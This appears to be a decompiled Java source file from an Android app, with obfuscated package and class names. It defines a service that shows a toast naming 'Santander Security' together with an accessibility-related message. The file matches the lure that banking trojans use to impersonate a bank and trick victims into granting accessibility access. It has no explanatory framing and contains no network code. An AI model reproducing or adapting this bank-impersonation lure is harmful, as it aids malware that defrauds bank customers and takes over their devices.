package wocwvy.czyxoxmbauu.slsa;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.widget.Toast;

public class clgqtzqdh extends Service {

    /* renamed from: a */
    C0034b f394a = new C0034b();

    /* renamed from: b */
    C0039c f395b = new C0039c();

    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    public int onStartCommand(Intent intent, int i, int i2) {
        String i3 = this.f394a.mo239i(this);
        this.f395b.getClass();
        if (!"Santander Security".equals("")) {
            this.f395b.getClass();
            i3 = "Santander Security";
        }
        StringBuilder sb = new StringBuilder();
        sb.append(this.f394a.mo234e(this, "StringAccessibility"));
        sb.append(" '");
        sb.append(i3);
        sb.append("'");
        Toast makeText = Toast.makeText(this, sb.toString(), 1);
        makeText.setGravity(16, 0, 0);
        makeText.show();
        return i;
    }
}
